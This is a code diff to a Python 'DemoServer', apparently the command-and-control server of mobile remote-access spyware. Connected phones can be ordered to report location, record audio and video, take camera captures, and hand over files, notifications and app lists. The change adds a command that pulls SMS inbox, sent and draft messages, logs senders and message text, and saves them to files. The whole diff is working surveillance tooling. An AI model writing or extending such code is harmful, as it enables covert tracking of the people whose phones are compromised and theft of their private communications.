@@ -281,7 +281,7 @@ class DemoServer:
                     self.send_command_to_all(custom_cmd, args_json)
 
                 # === v2.0/v3.0 Commands ===
-                elif command in ["take_photo", "get_location",
+                elif command in ["get_location",
                                  "record_audio", "get_app_list",
                                  "get_device_info", "heartbeat",
                                  "capture_front", "capture_back"]:
@@ -347,6 +347,9 @@ class DemoServer:
                 elif command == "get_notifications":
                     self.send_command_to_all("get_notifications")
 
+                elif command == "get_sms_logs":
+                    self.send_command_to_all("get_sms_logs")
+
                 else:
                     print(f"Unknown command: {command}. Type 'help' for available commands.")
 
@@ -381,12 +384,14 @@ class DemoServer:
         print("  16. download_file <p>  - Download a specific file")
         print("  17. record_video [s] [front|back] - Record video clip")
         print("  18. get_notifications  - Get recent notifications")
+        print("\n  --- v5.1 NEW Commands ---")
+        print("  19. get_sms_logs       - Get SMS/inbox messages")
         print("\n  --- Server Commands ---")
-        print("  19. list_devices       - Show connected devices")
-        print("  20. stats              - Show server statistics")
-        print("  21. send <cmd> [json]  - Send custom command with args")
-        print("  22. help               - Show this help")
-        print("  23. quit               - Stop server")
+        print("  20. list_devices       - Show connected devices")
+        print("  21. stats              - Show server statistics")
+        print("  22. send <cmd> [json]  - Send custom command with args")
+        print("  23. help               - Show this help")
+        print("  24. quit               - Stop server")
         print("=" * 60)
 
     def show_stats(self):
@@ -722,6 +727,25 @@ class DemoServer:
             with open(contacts_file, 'w') as f:
                 json.dump(contacts, f, indent=2)
             self.log(f"    [+] Saved to: {contacts_file}")
+            self.log_to_file(message, session.address)
+
+        elif msg_type == "sms_logs":
+            sms_list = message.get("sms", [])
+            count = message.get("count", 0)
+            self.log(f"[i] SMS logs from session {session.session_id} ({count} messages):")
+            for sms in sms_list[:20]:
+                from_num = sms.get("from", "?")
+                body = sms.get("body", "")[:60]
+                msg_type_map = {1: "INBOX", 2: "SENT", 3: "DRAFT", 4: "OUTBOX"}
+                sms_type = msg_type_map.get(sms.get("type", 1), "UNKNOWN")
+                self.log(f"    [{sms_type}] {from_num}: {body}...")
+            if count > 20:
+                self.log(f"    ... and {count - 20} more")
+            # Save to file
+            sms_file = os.path.join(DOCS_DIR, f"sms_logs_{session.session_id}_{int(time.time())}.json")
+            with open(sms_file, 'w') as f:
+                json.dump(sms_list, f, indent=2)
+            self.log(f"    [+] Saved to: {sms_file}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_list":
